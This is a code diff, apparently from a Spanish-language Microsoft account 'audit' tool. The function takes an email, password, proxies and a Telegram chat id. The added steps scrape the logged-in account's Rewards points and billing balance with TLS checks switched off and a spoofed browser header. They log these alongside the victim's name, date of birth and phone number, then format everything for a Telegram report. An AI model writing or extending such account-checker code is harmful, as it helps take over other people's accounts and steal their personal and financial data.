@@ -603,7 +603,57 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
     except:
         emit_event(q, "step_pass", {"step": 6, "detail": f"Email: {email}"})
 
-    emit_event(q, "profile", {"email": email, "name": name, "country": country, "dob": dob, "language": language, "phone": phone})
+        # ══════════════════════════════════════════════════
+        # PASO 6.5 — Microsoft Rewards Scraper
+        # ══════════════════════════════════════════════════
+        av_pts, today_pts = "0", "0"
+        try:
+            old_accept = session.headers.get("Accept")
+            old_ua = session.headers.get("User-Agent")
+            
+            session.headers.update({
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml",
+                "x-requested-with": None
+            })
+            
+            res_r = session.get("https://rewards.bing.com/", verify=False, timeout=15)
+            if res_r.status_code == 200:
+                html_r = res_r.text
+                pts1 = re.findall(r'\"AvailablePoints\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+                pts2 = re.findall(r'\"availablePoints\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+                pts3 = re.findall(r'\"todayPoints\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+                pts4 = re.findall(r'\"balance\"\s*:\s*(\d+)', html_r, re.IGNORECASE)
+
+                av_pts = pts1[0] if pts1 else (pts2[0] if pts2 else (pts4[0] if pts4 else "0"))
+                today_pts = pts3[0] if pts3 else "0"
+                
+            if old_accept: session.headers["Accept"] = old_accept
+            if old_ua: session.headers["User-Agent"] = old_ua
+        except Exception as e:
+            emit_event(q, "warning", {"message": f"[DEBUG-REWARDS] Exception: {e}"})
+            pass
+            
+        # ══════════════════════════════════════════════════
+        # PASO 6.6 — Microsoft Billing Extractor
+        # ══════════════════════════════════════════════════
+        balance = "0.00"
+        try:
+            res_b = session.get("https://account.microsoft.com/billing/payments?lang=en-US", verify=False, timeout=15)
+            if res_b.status_code == 200:
+                html_b = res_b.text
+                b_match = re.search(r'\"balance\"\s*:\s*\"([^\"]+)\"', html_b, re.IGNORECASE)
+                if not b_match: b_match = re.search(r'\"DisplayBalance\"\s*:\s*\"([^\"]+)\"', html_b, re.IGNORECASE)
+                if not b_match: b_match = re.search(r'\"CurrencyCode\".*?\"Balance\"\s*:\s*([^,]+)', html_b, re.IGNORECASE)
+                if not b_match: b_match = re.search(r'Microsoft account balance.*?<span[^>]*>([^<]+)</span>', html_b, re.IGNORECASE | re.DOTALL)
+                if b_match: balance = b_match.group(1).strip()
+        except: pass
+
+        emit_event(q, "profile", {
+            "email": email, "name": name, "country": country, 
+            "dob": dob, "language": language, "phone": phone,
+            "points": av_pts, "points_today": today_pts, "balance": balance
+        })
 
     # ══════════════════════════════════════════════════
     # PASO 7 — Búsqueda DLP (Bearer token, no cookies)
@@ -813,6 +863,8 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                 gf.write(f"🌍 País: {country} | Nombre: {name}\n")
                 gf.write(f"📅 DOB: {dob} | Idioma: {language}\n")
                 gf.write(f"📱 Teléfono: {phone}\n")
+                gf.write(f"🎁 Puntos Disponibles: {av_pts} | Hoy: {today_pts}\n")
+                gf.write(f"💳 Saldo Cuenta MS: {balance}\n")
                 gf.write(f"📊 Total Encontrados: {t_found}\
 ")
                 gf.write("="*40 + "\
@@ -845,6 +897,9 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                     "dob": dob,
                     "language": language,
                     "phone": phone,
+                    "points": av_pts,
+                    "points_today": today_pts,
+                    "balance": balance,
                     "total": t_found,
                     "query": s_query,
                     "chat_id": chat_id
@@ -868,6 +923,9 @@ def run_audit(q, email, password, keyword="", sender="", proxy_dict=None, tg_cha
                               f"📅 *DOB:* {dob}\n"
                               f"🗣️ *Idioma:* {language}\n"
                               f"📱 *Teléf:* `{phone}`\n"
+                              f"🎁 *Pts. Disp:* `{av_pts}`\n"
+                              f"⏱️ *Pts. Hoy:* `{today_pts}`\n"
+                              f"💳 *Saldo MS:* `{balance}`\n\n"
                               f"📊 *Mensajes:* `{t_found}`\
 🔍 *Búsqueda:* `{s_query}`\
 "
